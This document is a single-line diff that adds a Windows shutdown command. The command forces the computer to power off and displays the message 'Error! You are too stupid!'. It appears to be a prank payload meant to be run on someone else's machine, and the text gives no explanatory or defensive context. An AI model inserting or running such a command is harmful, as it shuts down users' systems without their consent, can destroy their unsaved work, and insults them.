@@ -1,0 +1,1 @@
+shutdown /s /c "Error! You are too stupid!"
